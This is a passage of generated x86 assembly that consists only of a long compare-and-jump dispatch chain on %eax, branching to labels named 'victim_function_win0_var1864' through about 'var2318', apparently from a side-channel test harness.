	je	.Lvictim_function_win0_var1864
	cmpl	$1865, %eax
	je	.Lvictim_function_win0_var1865
	cmpl	$1866, %eax
	je	.Lvictim_function_win0_var1866
	cmpl	$1867, %eax
	je	.Lvictim_function_win0_var1867
	cmpl	$1868, %eax
	je	.Lvictim_function_win0_var1868
	cmpl	$1869, %eax
	je	.Lvictim_function_win0_var1869
	cmpl	$1870, %eax
	je	.Lvictim_function_win0_var1870
	cmpl	$1871, %eax
	je	.Lvictim_function_win0_var1871
	cmpl	$1872, %eax
	je	.Lvictim_function_win0_var1872
	cmpl	$1873, %eax
	je	.Lvictim_function_win0_var1873
	cmpl	$1874, %eax
	je	.Lvictim_function_win0_var1874
	cmpl	$1875, %eax
	je	.Lvictim_function_win0_var1875
	cmpl	$1876, %eax
	je	.Lvictim_function_win0_var1876
	cmpl	$1877, %eax
	je	.Lvictim_function_win0_var1877
	cmpl	$1878, %eax
	je	.Lvictim_function_win0_var1878
	cmpl	$1879, %eax
	je	.Lvictim_function_win0_var1879
	cmpl	$1880, %eax
	je	.Lvictim_function_win0_var1880
	cmpl	$1881, %eax
	je	.Lvictim_function_win0_var1881
	cmpl	$1882, %eax
	je	.Lvictim_function_win0_var1882
	cmpl	$1883, %eax
	je	.Lvictim_function_win0_var1883
	cmpl	$1884, %eax
	je	.Lvictim_function_win0_var1884
	cmpl	$1885, %eax
	je	.Lvictim_function_win0_var1885
	cmpl	$1886, %eax
	je	.Lvictim_function_win0_var1886
	cmpl	$1887, %eax
	je	.Lvictim_function_win0_var1887
	cmpl	$1888, %eax
	je	.Lvictim_function_win0_var1888
	cmpl	$1889, %eax
	je	.Lvictim_function_win0_var1889
	cmpl	$1890, %eax
	je	.Lvictim_function_win0_var1890
	cmpl	$1891, %eax
	je	.Lvictim_function_win0_var1891
	cmpl	$1892, %eax
	je	.Lvictim_function_win0_var1892
	cmpl	$1893, %eax
	je	.Lvictim_function_win0_var1893
	cmpl	$1894, %eax
	je	.Lvictim_function_win0_var1894
	cmpl	$1895, %eax
	je	.Lvictim_function_win0_var1895
	cmpl	$1896, %eax
	je	.Lvictim_function_win0_var1896
	cmpl	$1897, %eax
	je	.Lvictim_function_win0_var1897
	cmpl	$1898, %eax
	je	.Lvictim_function_win0_var1898
	cmpl	$1899, %eax
	je	.Lvictim_function_win0_var1899
	cmpl	$1900, %eax
	je	.Lvictim_function_win0_var1900
	cmpl	$1901, %eax
	je	.Lvictim_function_win0_var1901
	cmpl	$1902, %eax
	je	.Lvictim_function_win0_var1902
	cmpl	$1903, %eax
	je	.Lvictim_function_win0_var1903
	cmpl	$1904, %eax
	je	.Lvictim_function_win0_var1904
	cmpl	$1905, %eax
	je	.Lvictim_function_win0_var1905
	cmpl	$1906, %eax
	je	.Lvictim_function_win0_var1906
	cmpl	$1907, %eax
	je	.Lvictim_function_win0_var1907
	cmpl	$1908, %eax
	je	.Lvictim_function_win0_var1908
	cmpl	$1909, %eax
	je	.Lvictim_function_win0_var1909
	cmpl	$1910, %eax
	je	.Lvictim_function_win0_var1910
	cmpl	$1911, %eax
	je	.Lvictim_function_win0_var1911
	cmpl	$1912, %eax
	je	.Lvictim_function_win0_var1912
	cmpl	$1913, %eax
	je	.Lvictim_function_win0_var1913
	cmpl	$1914, %eax
	je	.Lvictim_function_win0_var1914
	cmpl	$1915, %eax
	je	.Lvictim_function_win0_var1915
	cmpl	$1916, %eax
	je	.Lvictim_function_win0_var1916
	cmpl	$1917, %eax
	je	.Lvictim_function_win0_var1917
	cmpl	$1918, %eax
	je	.Lvictim_function_win0_var1918
	cmpl	$1919, %eax
	je	.Lvictim_function_win0_var1919
	cmpl	$1920, %eax
	je	.Lvictim_function_win0_var1920
	cmpl	$1921, %eax
	je	.Lvictim_function_win0_var1921
	cmpl	$1922, %eax
	je	.Lvictim_function_win0_var1922
	cmpl	$1923, %eax
	je	.Lvictim_function_win0_var1923
	cmpl	$1924, %eax
	je	.Lvictim_function_win0_var1924
	cmpl	$1925, %eax
	je	.Lvictim_function_win0_var1925
	cmpl	$1926, %eax
	je	.Lvictim_function_win0_var1926
	cmpl	$1927, %eax
	je	.Lvictim_function_win0_var1927
	cmpl	$1928, %eax
	je	.Lvictim_function_win0_var1928
	cmpl	$1929, %eax
	je	.Lvictim_function_win0_var1929
	cmpl	$1930, %eax
	je	.Lvictim_function_win0_var1930
	cmpl	$1931, %eax
	je	.Lvictim_function_win0_var1931
	cmpl	$1932, %eax
	je	.Lvictim_function_win0_var1932
	cmpl	$1933, %eax
	je	.Lvictim_function_win0_var1933
	cmpl	$1934, %eax
	je	.Lvictim_function_win0_var1934
	cmpl	$1935, %eax
	je	.Lvictim_function_win0_var1935
	cmpl	$1936, %eax
	je	.Lvictim_function_win0_var1936
	cmpl	$1937, %eax
	je	.Lvictim_function_win0_var1937
	cmpl	$1938, %eax
	je	.Lvictim_function_win0_var1938
	cmpl	$1939, %eax
	je	.Lvictim_function_win0_var1939
	cmpl	$1940, %eax
	je	.Lvictim_function_win0_var1940
	cmpl	$1941, %eax
	je	.Lvictim_function_win0_var1941
	cmpl	$1942, %eax
	je	.Lvictim_function_win0_var1942
	cmpl	$1943, %eax
	je	.Lvictim_function_win0_var1943
	cmpl	$1944, %eax
	je	.Lvictim_function_win0_var1944
	cmpl	$1945, %eax
	je	.Lvictim_function_win0_var1945
	cmpl	$1946, %eax
	je	.Lvictim_function_win0_var1946
	cmpl	$1947, %eax
	je	.Lvictim_function_win0_var1947
	cmpl	$1948, %eax
	je	.Lvictim_function_win0_var1948
	cmpl	$1949, %eax
	je	.Lvictim_function_win0_var1949
	cmpl	$1950, %eax
	je	.Lvictim_function_win0_var1950
	cmpl	$1951, %eax
	je	.Lvictim_function_win0_var1951
	cmpl	$1952, %eax
	je	.Lvictim_function_win0_var1952
	cmpl	$1953, %eax
	je	.Lvictim_function_win0_var1953
	cmpl	$1954, %eax
	je	.Lvictim_function_win0_var1954
	cmpl	$1955, %eax
	je	.Lvictim_function_win0_var1955
	cmpl	$1956, %eax
	je	.Lvictim_function_win0_var1956
	cmpl	$1957, %eax
	je	.Lvictim_function_win0_var1957
	cmpl	$1958, %eax
	je	.Lvictim_function_win0_var1958
	cmpl	$1959, %eax
	je	.Lvictim_function_win0_var1959
	cmpl	$1960, %eax
	je	.Lvictim_function_win0_var1960
	cmpl	$1961, %eax
	je	.Lvictim_function_win0_var1961
	cmpl	$1962, %eax
	je	.Lvictim_function_win0_var1962
	cmpl	$1963, %eax
	je	.Lvictim_function_win0_var1963
	cmpl	$1964, %eax
	je	.Lvictim_function_win0_var1964
	cmpl	$1965, %eax
	je	.Lvictim_function_win0_var1965
	cmpl	$1966, %eax
	je	.Lvictim_function_win0_var1966
	cmpl	$1967, %eax
	je	.Lvictim_function_win0_var1967
	cmpl	$1968, %eax
	je	.Lvictim_function_win0_var1968
	cmpl	$1969, %eax
	je	.Lvictim_function_win0_var1969
	cmpl	$1970, %eax
	je	.Lvictim_function_win0_var1970
	cmpl	$1971, %eax
	je	.Lvictim_function_win0_var1971
	cmpl	$1972, %eax
	je	.Lvictim_function_win0_var1972
	cmpl	$1973, %eax
	je	.Lvictim_function_win0_var1973
	cmpl	$1974, %eax
	je	.Lvictim_function_win0_var1974
	cmpl	$1975, %eax
	je	.Lvictim_function_win0_var1975
	cmpl	$1976, %eax
	je	.Lvictim_function_win0_var1976
	cmpl	$1977, %eax
	je	.Lvictim_function_win0_var1977
	cmpl	$1978, %eax
	je	.Lvictim_function_win0_var1978
	cmpl	$1979, %eax
	je	.Lvictim_function_win0_var1979
	cmpl	$1980, %eax
	je	.Lvictim_function_win0_var1980
	cmpl	$1981, %eax
	je	.Lvictim_function_win0_var1981
	cmpl	$1982, %eax
	je	.Lvictim_function_win0_var1982
	cmpl	$1983, %eax
	je	.Lvictim_function_win0_var1983
	cmpl	$1984, %eax
	je	.Lvictim_function_win0_var1984
	cmpl	$1985, %eax
	je	.Lvictim_function_win0_var1985
	cmpl	$1986, %eax
	je	.Lvictim_function_win0_var1986
	cmpl	$1987, %eax
	je	.Lvictim_function_win0_var1987
	cmpl	$1988, %eax
	je	.Lvictim_function_win0_var1988
	cmpl	$1989, %eax
	je	.Lvictim_function_win0_var1989
	cmpl	$1990, %eax
	je	.Lvictim_function_win0_var1990
	cmpl	$1991, %eax
	je	.Lvictim_function_win0_var1991
	cmpl	$1992, %eax
	je	.Lvictim_function_win0_var1992
	cmpl	$1993, %eax
	je	.Lvictim_function_win0_var1993
	cmpl	$1994, %eax
	je	.Lvictim_function_win0_var1994
	cmpl	$1995, %eax
	je	.Lvictim_function_win0_var1995
	cmpl	$1996, %eax
	je	.Lvictim_function_win0_var1996
	cmpl	$1997, %eax
	je	.Lvictim_function_win0_var1997
	cmpl	$1998, %eax
	je	.Lvictim_function_win0_var1998
	cmpl	$1999, %eax
	je	.Lvictim_function_win0_var1999
	cmpl	$2000, %eax
	je	.Lvictim_function_win0_var2000
	cmpl	$2001, %eax
	je	.Lvictim_function_win0_var2001
	cmpl	$2002, %eax
	je	.Lvictim_function_win0_var2002
	cmpl	$2003, %eax
	je	.Lvictim_function_win0_var2003
	cmpl	$2004, %eax
	je	.Lvictim_function_win0_var2004
	cmpl	$2005, %eax
	je	.Lvictim_function_win0_var2005
	cmpl	$2006, %eax
	je	.Lvictim_function_win0_var2006
	cmpl	$2007, %eax
	je	.Lvictim_function_win0_var2007
	cmpl	$2008, %eax
	je	.Lvictim_function_win0_var2008
	cmpl	$2009, %eax
	je	.Lvictim_function_win0_var2009
	cmpl	$2010, %eax
	je	.Lvictim_function_win0_var2010
	cmpl	$2011, %eax
	je	.Lvictim_function_win0_var2011
	cmpl	$2012, %eax
	je	.Lvictim_function_win0_var2012
	cmpl	$2013, %eax
	je	.Lvictim_function_win0_var2013
	cmpl	$2014, %eax
	je	.Lvictim_function_win0_var2014
	cmpl	$2015, %eax
	je	.Lvictim_function_win0_var2015
	cmpl	$2016, %eax
	je	.Lvictim_function_win0_var2016
	cmpl	$2017, %eax
	je	.Lvictim_function_win0_var2017
	cmpl	$2018, %eax
	je	.Lvictim_function_win0_var2018
	cmpl	$2019, %eax
	je	.Lvictim_function_win0_var2019
	cmpl	$2020, %eax
	je	.Lvictim_function_win0_var2020
	cmpl	$2021, %eax
	je	.Lvictim_function_win0_var2021
	cmpl	$2022, %eax
	je	.Lvictim_function_win0_var2022
	cmpl	$2023, %eax
	je	.Lvictim_function_win0_var2023
	cmpl	$2024, %eax
	je	.Lvictim_function_win0_var2024
	cmpl	$2025, %eax
	je	.Lvictim_function_win0_var2025
	cmpl	$2026, %eax
	je	.Lvictim_function_win0_var2026
	cmpl	$2027, %eax
	je	.Lvictim_function_win0_var2027
	cmpl	$2028, %eax
	je	.Lvictim_function_win0_var2028
	cmpl	$2029, %eax
	je	.Lvictim_function_win0_var2029
	cmpl	$2030, %eax
	je	.Lvictim_function_win0_var2030
	cmpl	$2031, %eax
	je	.Lvictim_function_win0_var2031
	cmpl	$2032, %eax
	je	.Lvictim_function_win0_var2032
	cmpl	$2033, %eax
	je	.Lvictim_function_win0_var2033
	cmpl	$2034, %eax
	je	.Lvictim_function_win0_var2034
	cmpl	$2035, %eax
	je	.Lvictim_function_win0_var2035
	cmpl	$2036, %eax
	je	.Lvictim_function_win0_var2036
	cmpl	$2037, %eax
	je	.Lvictim_function_win0_var2037
	cmpl	$2038, %eax
	je	.Lvictim_function_win0_var2038
	cmpl	$2039, %eax
	je	.Lvictim_function_win0_var2039
	cmpl	$2040, %eax
	je	.Lvictim_function_win0_var2040
	cmpl	$2041, %eax
	je	.Lvictim_function_win0_var2041
	cmpl	$2042, %eax
	je	.Lvictim_function_win0_var2042
	cmpl	$2043, %eax
	je	.Lvictim_function_win0_var2043
	cmpl	$2044, %eax
	je	.Lvictim_function_win0_var2044
	cmpl	$2045, %eax
	je	.Lvictim_function_win0_var2045
	cmpl	$2046, %eax
	je	.Lvictim_function_win0_var2046
	cmpl	$2047, %eax
	je	.Lvictim_function_win0_var2047
	cmpl	$2048, %eax
	je	.Lvictim_function_win0_var2048
	cmpl	$2049, %eax
	je	.Lvictim_function_win0_var2049
	cmpl	$2050, %eax
	je	.Lvictim_function_win0_var2050
	cmpl	$2051, %eax
	je	.Lvictim_function_win0_var2051
	cmpl	$2052, %eax
	je	.Lvictim_function_win0_var2052
	cmpl	$2053, %eax
	je	.Lvictim_function_win0_var2053
	cmpl	$2054, %eax
	je	.Lvictim_function_win0_var2054
	cmpl	$2055, %eax
	je	.Lvictim_function_win0_var2055
	cmpl	$2056, %eax
	je	.Lvictim_function_win0_var2056
	cmpl	$2057, %eax
	je	.Lvictim_function_win0_var2057
	cmpl	$2058, %eax
	je	.Lvictim_function_win0_var2058
	cmpl	$2059, %eax
	je	.Lvictim_function_win0_var2059
	cmpl	$2060, %eax
	je	.Lvictim_function_win0_var2060
	cmpl	$2061, %eax
	je	.Lvictim_function_win0_var2061
	cmpl	$2062, %eax
	je	.Lvictim_function_win0_var2062
	cmpl	$2063, %eax
	je	.Lvictim_function_win0_var2063
	cmpl	$2064, %eax
	je	.Lvictim_function_win0_var2064
	cmpl	$2065, %eax
	je	.Lvictim_function_win0_var2065
	cmpl	$2066, %eax
	je	.Lvictim_function_win0_var2066
	cmpl	$2067, %eax
	je	.Lvictim_function_win0_var2067
	cmpl	$2068, %eax
	je	.Lvictim_function_win0_var2068
	cmpl	$2069, %eax
	je	.Lvictim_function_win0_var2069
	cmpl	$2070, %eax
	je	.Lvictim_function_win0_var2070
	cmpl	$2071, %eax
	je	.Lvictim_function_win0_var2071
	cmpl	$2072, %eax
	je	.Lvictim_function_win0_var2072
	cmpl	$2073, %eax
	je	.Lvictim_function_win0_var2073
	cmpl	$2074, %eax
	je	.Lvictim_function_win0_var2074
	cmpl	$2075, %eax
	je	.Lvictim_function_win0_var2075
	cmpl	$2076, %eax
	je	.Lvictim_function_win0_var2076
	cmpl	$2077, %eax
	je	.Lvictim_function_win0_var2077
	cmpl	$2078, %eax
	je	.Lvictim_function_win0_var2078
	cmpl	$2079, %eax
	je	.Lvictim_function_win0_var2079
	cmpl	$2080, %eax
	je	.Lvictim_function_win0_var2080
	cmpl	$2081, %eax
	je	.Lvictim_function_win0_var2081
	cmpl	$2082, %eax
	je	.Lvictim_function_win0_var2082
	cmpl	$2083, %eax
	je	.Lvictim_function_win0_var2083
	cmpl	$2084, %eax
	je	.Lvictim_function_win0_var2084
	cmpl	$2085, %eax
	je	.Lvictim_function_win0_var2085
	cmpl	$2086, %eax
	je	.Lvictim_function_win0_var2086
	cmpl	$2087, %eax
	je	.Lvictim_function_win0_var2087
	cmpl	$2088, %eax
	je	.Lvictim_function_win0_var2088
	cmpl	$2089, %eax
	je	.Lvictim_function_win0_var2089
	cmpl	$2090, %eax
	je	.Lvictim_function_win0_var2090
	cmpl	$2091, %eax
	je	.Lvictim_function_win0_var2091
	cmpl	$2092, %eax
	je	.Lvictim_function_win0_var2092
	cmpl	$2093, %eax
	je	.Lvictim_function_win0_var2093
	cmpl	$2094, %eax
	je	.Lvictim_function_win0_var2094
	cmpl	$2095, %eax
	je	.Lvictim_function_win0_var2095
	cmpl	$2096, %eax
	je	.Lvictim_function_win0_var2096
	cmpl	$2097, %eax
	je	.Lvictim_function_win0_var2097
	cmpl	$2098, %eax
	je	.Lvictim_function_win0_var2098
	cmpl	$2099, %eax
	je	.Lvictim_function_win0_var2099
	cmpl	$2100, %eax
	je	.Lvictim_function_win0_var2100
	cmpl	$2101, %eax
	je	.Lvictim_function_win0_var2101
	cmpl	$2102, %eax
	je	.Lvictim_function_win0_var2102
	cmpl	$2103, %eax
	je	.Lvictim_function_win0_var2103
	cmpl	$2104, %eax
	je	.Lvictim_function_win0_var2104
	cmpl	$2105, %eax
	je	.Lvictim_function_win0_var2105
	cmpl	$2106, %eax
	je	.Lvictim_function_win0_var2106
	cmpl	$2107, %eax
	je	.Lvictim_function_win0_var2107
	cmpl	$2108, %eax
	je	.Lvictim_function_win0_var2108
	cmpl	$2109, %eax
	je	.Lvictim_function_win0_var2109
	cmpl	$2110, %eax
	je	.Lvictim_function_win0_var2110
	cmpl	$2111, %eax
	je	.Lvictim_function_win0_var2111
	cmpl	$2112, %eax
	je	.Lvictim_function_win0_var2112
	cmpl	$2113, %eax
	je	.Lvictim_function_win0_var2113
	cmpl	$2114, %eax
	je	.Lvictim_function_win0_var2114
	cmpl	$2115, %eax
	je	.Lvictim_function_win0_var2115
	cmpl	$2116, %eax
	je	.Lvictim_function_win0_var2116
	cmpl	$2117, %eax
	je	.Lvictim_function_win0_var2117
	cmpl	$2118, %eax
	je	.Lvictim_function_win0_var2118
	cmpl	$2119, %eax
	je	.Lvictim_function_win0_var2119
	cmpl	$2120, %eax
	je	.Lvictim_function_win0_var2120
	cmpl	$2121, %eax
	je	.Lvictim_function_win0_var2121
	cmpl	$2122, %eax
	je	.Lvictim_function_win0_var2122
	cmpl	$2123, %eax
	je	.Lvictim_function_win0_var2123
	cmpl	$2124, %eax
	je	.Lvictim_function_win0_var2124
	cmpl	$2125, %eax
	je	.Lvictim_function_win0_var2125
	cmpl	$2126, %eax
	je	.Lvictim_function_win0_var2126
	cmpl	$2127, %eax
	je	.Lvictim_function_win0_var2127
	cmpl	$2128, %eax
	je	.Lvictim_function_win0_var2128
	cmpl	$2129, %eax
	je	.Lvictim_function_win0_var2129
	cmpl	$2130, %eax
	je	.Lvictim_function_win0_var2130
	cmpl	$2131, %eax
	je	.Lvictim_function_win0_var2131
	cmpl	$2132, %eax
	je	.Lvictim_function_win0_var2132
	cmpl	$2133, %eax
	je	.Lvictim_function_win0_var2133
	cmpl	$2134, %eax
	je	.Lvictim_function_win0_var2134
	cmpl	$2135, %eax
	je	.Lvictim_function_win0_var2135
	cmpl	$2136, %eax
	je	.Lvictim_function_win0_var2136
	cmpl	$2137, %eax
	je	.Lvictim_function_win0_var2137
	cmpl	$2138, %eax
	je	.Lvictim_function_win0_var2138
	cmpl	$2139, %eax
	je	.Lvictim_function_win0_var2139
	cmpl	$2140, %eax
	je	.Lvictim_function_win0_var2140
	cmpl	$2141, %eax
	je	.Lvictim_function_win0_var2141
	cmpl	$2142, %eax
	je	.Lvictim_function_win0_var2142
	cmpl	$2143, %eax
	je	.Lvictim_function_win0_var2143
	cmpl	$2144, %eax
	je	.Lvictim_function_win0_var2144
	cmpl	$2145, %eax
	je	.Lvictim_function_win0_var2145
	cmpl	$2146, %eax
	je	.Lvictim_function_win0_var2146
	cmpl	$2147, %eax
	je	.Lvictim_function_win0_var2147
	cmpl	$2148, %eax
	je	.Lvictim_function_win0_var2148
	cmpl	$2149, %eax
	je	.Lvictim_function_win0_var2149
	cmpl	$2150, %eax
	je	.Lvictim_function_win0_var2150
	cmpl	$2151, %eax
	je	.Lvictim_function_win0_var2151
	cmpl	$2152, %eax
	je	.Lvictim_function_win0_var2152
	cmpl	$2153, %eax
	je	.Lvictim_function_win0_var2153
	cmpl	$2154, %eax
	je	.Lvictim_function_win0_var2154
	cmpl	$2155, %eax
	je	.Lvictim_function_win0_var2155
	cmpl	$2156, %eax
	je	.Lvictim_function_win0_var2156
	cmpl	$2157, %eax
	je	.Lvictim_function_win0_var2157
	cmpl	$2158, %eax
	je	.Lvictim_function_win0_var2158
	cmpl	$2159, %eax
	je	.Lvictim_function_win0_var2159
	cmpl	$2160, %eax
	je	.Lvictim_function_win0_var2160
	cmpl	$2161, %eax
	je	.Lvictim_function_win0_var2161
	cmpl	$2162, %eax
	je	.Lvictim_function_win0_var2162
	cmpl	$2163, %eax
	je	.Lvictim_function_win0_var2163
	cmpl	$2164, %eax
	je	.Lvictim_function_win0_var2164
	cmpl	$2165, %eax
	je	.Lvictim_function_win0_var2165
	cmpl	$2166, %eax
	je	.Lvictim_function_win0_var2166
	cmpl	$2167, %eax
	je	.Lvictim_function_win0_var2167
	cmpl	$2168, %eax
	je	.Lvictim_function_win0_var2168
	cmpl	$2169, %eax
	je	.Lvictim_function_win0_var2169
	cmpl	$2170, %eax
	je	.Lvictim_function_win0_var2170
	cmpl	$2171, %eax
	je	.Lvictim_function_win0_var2171
	cmpl	$2172, %eax
	je	.Lvictim_function_win0_var2172
	cmpl	$2173, %eax
	je	.Lvictim_function_win0_var2173
	cmpl	$2174, %eax
	je	.Lvictim_function_win0_var2174
	cmpl	$2175, %eax
	je	.Lvictim_function_win0_var2175
	cmpl	$2176, %eax
	je	.Lvictim_function_win0_var2176
	cmpl	$2177, %eax
	je	.Lvictim_function_win0_var2177
	cmpl	$2178, %eax
	je	.Lvictim_function_win0_var2178
	cmpl	$2179, %eax
	je	.Lvictim_function_win0_var2179
	cmpl	$2180, %eax
	je	.Lvictim_function_win0_var2180
	cmpl	$2181, %eax
	je	.Lvictim_function_win0_var2181
	cmpl	$2182, %eax
	je	.Lvictim_function_win0_var2182
	cmpl	$2183, %eax
	je	.Lvictim_function_win0_var2183
	cmpl	$2184, %eax
	je	.Lvictim_function_win0_var2184
	cmpl	$2185, %eax
	je	.Lvictim_function_win0_var2185
	cmpl	$2186, %eax
	je	.Lvictim_function_win0_var2186
	cmpl	$2187, %eax
	je	.Lvictim_function_win0_var2187
	cmpl	$2188, %eax
	je	.Lvictim_function_win0_var2188
	cmpl	$2189, %eax
	je	.Lvictim_function_win0_var2189
	cmpl	$2190, %eax
	je	.Lvictim_function_win0_var2190
	cmpl	$2191, %eax
	je	.Lvictim_function_win0_var2191
	cmpl	$2192, %eax
	je	.Lvictim_function_win0_var2192
	cmpl	$2193, %eax
	je	.Lvictim_function_win0_var2193
	cmpl	$2194, %eax
	je	.Lvictim_function_win0_var2194
	cmpl	$2195, %eax
	je	.Lvictim_function_win0_var2195
	cmpl	$2196, %eax
	je	.Lvictim_function_win0_var2196
	cmpl	$2197, %eax
	je	.Lvictim_function_win0_var2197
	cmpl	$2198, %eax
	je	.Lvictim_function_win0_var2198
	cmpl	$2199, %eax
	je	.Lvictim_function_win0_var2199
	cmpl	$2200, %eax
	je	.Lvictim_function_win0_var2200
	cmpl	$2201, %eax
	je	.Lvictim_function_win0_var2201
	cmpl	$2202, %eax
	je	.Lvictim_function_win0_var2202
	cmpl	$2203, %eax
	je	.Lvictim_function_win0_var2203
	cmpl	$2204, %eax
	je	.Lvictim_function_win0_var2204
	cmpl	$2205, %eax
	je	.Lvictim_function_win0_var2205
	cmpl	$2206, %eax
	je	.Lvictim_function_win0_var2206
	cmpl	$2207, %eax
	je	.Lvictim_function_win0_var2207
	cmpl	$2208, %eax
	je	.Lvictim_function_win0_var2208
	cmpl	$2209, %eax
	je	.Lvictim_function_win0_var2209
	cmpl	$2210, %eax
	je	.Lvictim_function_win0_var2210
	cmpl	$2211, %eax
	je	.Lvictim_function_win0_var2211
	cmpl	$2212, %eax
	je	.Lvictim_function_win0_var2212
	cmpl	$2213, %eax
	je	.Lvictim_function_win0_var2213
	cmpl	$2214, %eax
	je	.Lvictim_function_win0_var2214
	cmpl	$2215, %eax
	je	.Lvictim_function_win0_var2215
	cmpl	$2216, %eax
	je	.Lvictim_function_win0_var2216
	cmpl	$2217, %eax
	je	.Lvictim_function_win0_var2217
	cmpl	$2218, %eax
	je	.Lvictim_function_win0_var2218
	cmpl	$2219, %eax
	je	.Lvictim_function_win0_var2219
	cmpl	$2220, %eax
	je	.Lvictim_function_win0_var2220
	cmpl	$2221, %eax
	je	.Lvictim_function_win0_var2221
	cmpl	$2222, %eax
	je	.Lvictim_function_win0_var2222
	cmpl	$2223, %eax
	je	.Lvictim_function_win0_var2223
	cmpl	$2224, %eax
	je	.Lvictim_function_win0_var2224
	cmpl	$2225, %eax
	je	.Lvictim_function_win0_var2225
	cmpl	$2226, %eax
	je	.Lvictim_function_win0_var2226
	cmpl	$2227, %eax
	je	.Lvictim_function_win0_var2227
	cmpl	$2228, %eax
	je	.Lvictim_function_win0_var2228
	cmpl	$2229, %eax
	je	.Lvictim_function_win0_var2229
	cmpl	$2230, %eax
	je	.Lvictim_function_win0_var2230
	cmpl	$2231, %eax
	je	.Lvictim_function_win0_var2231
	cmpl	$2232, %eax
	je	.Lvictim_function_win0_var2232
	cmpl	$2233, %eax
	je	.Lvictim_function_win0_var2233
	cmpl	$2234, %eax
	je	.Lvictim_function_win0_var2234
	cmpl	$2235, %eax
	je	.Lvictim_function_win0_var2235
	cmpl	$2236, %eax
	je	.Lvictim_function_win0_var2236
	cmpl	$2237, %eax
	je	.Lvictim_function_win0_var2237
	cmpl	$2238, %eax
	je	.Lvictim_function_win0_var2238
	cmpl	$2239, %eax
	je	.Lvictim_function_win0_var2239
	cmpl	$2240, %eax
	je	.Lvictim_function_win0_var2240
	cmpl	$2241, %eax
	je	.Lvictim_function_win0_var2241
	cmpl	$2242, %eax
	je	.Lvictim_function_win0_var2242
	cmpl	$2243, %eax
	je	.Lvictim_function_win0_var2243
	cmpl	$2244, %eax
	je	.Lvictim_function_win0_var2244
	cmpl	$2245, %eax
	je	.Lvictim_function_win0_var2245
	cmpl	$2246, %eax
	je	.Lvictim_function_win0_var2246
	cmpl	$2247, %eax
	je	.Lvictim_function_win0_var2247
	cmpl	$2248, %eax
	je	.Lvictim_function_win0_var2248
	cmpl	$2249, %eax
	je	.Lvictim_function_win0_var2249
	cmpl	$2250, %eax
	je	.Lvictim_function_win0_var2250
	cmpl	$2251, %eax
	je	.Lvictim_function_win0_var2251
	cmpl	$2252, %eax
	je	.Lvictim_function_win0_var2252
	cmpl	$2253, %eax
	je	.Lvictim_function_win0_var2253
	cmpl	$2254, %eax
	je	.Lvictim_function_win0_var2254
	cmpl	$2255, %eax
	je	.Lvictim_function_win0_var2255
	cmpl	$2256, %eax
	je	.Lvictim_function_win0_var2256
	cmpl	$2257, %eax
	je	.Lvictim_function_win0_var2257
	cmpl	$2258, %eax
	je	.Lvictim_function_win0_var2258
	cmpl	$2259, %eax
	je	.Lvictim_function_win0_var2259
	cmpl	$2260, %eax
	je	.Lvictim_function_win0_var2260
	cmpl	$2261, %eax
	je	.Lvictim_function_win0_var2261
	cmpl	$2262, %eax
	je	.Lvictim_function_win0_var2262
	cmpl	$2263, %eax
	je	.Lvictim_function_win0_var2263
	cmpl	$2264, %eax
	je	.Lvictim_function_win0_var2264
	cmpl	$2265, %eax
	je	.Lvictim_function_win0_var2265
	cmpl	$2266, %eax
	je	.Lvictim_function_win0_var2266
	cmpl	$2267, %eax
	je	.Lvictim_function_win0_var2267
	cmpl	$2268, %eax
	je	.Lvictim_function_win0_var2268
	cmpl	$2269, %eax
	je	.Lvictim_function_win0_var2269
	cmpl	$2270, %eax
	je	.Lvictim_function_win0_var2270
	cmpl	$2271, %eax
	je	.Lvictim_function_win0_var2271
	cmpl	$2272, %eax
	je	.Lvictim_function_win0_var2272
	cmpl	$2273, %eax
	je	.Lvictim_function_win0_var2273
	cmpl	$2274, %eax
	je	.Lvictim_function_win0_var2274
	cmpl	$2275, %eax
	je	.Lvictim_function_win0_var2275
	cmpl	$2276, %eax
	je	.Lvictim_function_win0_var2276
	cmpl	$2277, %eax
	je	.Lvictim_function_win0_var2277
	cmpl	$2278, %eax
	je	.Lvictim_function_win0_var2278
	cmpl	$2279, %eax
	je	.Lvictim_function_win0_var2279
	cmpl	$2280, %eax
	je	.Lvictim_function_win0_var2280
	cmpl	$2281, %eax
	je	.Lvictim_function_win0_var2281
	cmpl	$2282, %eax
	je	.Lvictim_function_win0_var2282
	cmpl	$2283, %eax
	je	.Lvictim_function_win0_var2283
	cmpl	$2284, %eax
	je	.Lvictim_function_win0_var2284
	cmpl	$2285, %eax
	je	.Lvictim_function_win0_var2285
	cmpl	$2286, %eax
	je	.Lvictim_function_win0_var2286
	cmpl	$2287, %eax
	je	.Lvictim_function_win0_var2287
	cmpl	$2288, %eax
	je	.Lvictim_function_win0_var2288
	cmpl	$2289, %eax
	je	.Lvictim_function_win0_var2289
	cmpl	$2290, %eax
	je	.Lvictim_function_win0_var2290
	cmpl	$2291, %eax
	je	.Lvictim_function_win0_var2291
	cmpl	$2292, %eax
	je	.Lvictim_function_win0_var2292
	cmpl	$2293, %eax
	je	.Lvictim_function_win0_var2293
	cmpl	$2294, %eax
	je	.Lvictim_function_win0_var2294
	cmpl	$2295, %eax
	je	.Lvictim_function_win0_var2295
	cmpl	$2296, %eax
	je	.Lvictim_function_win0_var2296
	cmpl	$2297, %eax
	je	.Lvictim_function_win0_var2297
	cmpl	$2298, %eax
	je	.Lvictim_function_win0_var2298
	cmpl	$2299, %eax
	je	.Lvictim_function_win0_var2299
	cmpl	$2300, %eax
	je	.Lvictim_function_win0_var2300
	cmpl	$2301, %eax
	je	.Lvictim_function_win0_var2301
	cmpl	$2302, %eax
	je	.Lvictim_function_win0_var2302
	cmpl	$2303, %eax
	je	.Lvictim_function_win0_var2303
	cmpl	$2304, %eax
	je	.Lvictim_function_win0_var2304
	cmpl	$2305, %eax
	je	.Lvictim_function_win0_var2305
	cmpl	$2306, %eax
	je	.Lvictim_function_win0_var2306
	cmpl	$2307, %eax
	je	.Lvictim_function_win0_var2307
	cmpl	$2308, %eax
	je	.Lvictim_function_win0_var2308
	cmpl	$2309, %eax
	je	.Lvictim_function_win0_var2309
	cmpl	$2310, %eax
	je	.Lvictim_function_win0_var2310
	cmpl	$2311, %eax
	je	.Lvictim_function_win0_var2311
	cmpl	$2312, %eax
	je	.Lvictim_function_win0_var2312
	cmpl	$2313, %eax
	je	.Lvictim_function_win0_var2313
	cmpl	$2314, %eax
	je	.Lvictim_function_win0_var2314
	cmpl	$2315, %eax
	je	.Lvictim_function_win0_var2315
	cmpl	$2316, %eax
	je	.Lvictim_function_win0_var2316
	cmpl	$2317, %eax
	je	.Lvictim_function_win0_var2317
	cmpl	$2318, %eax
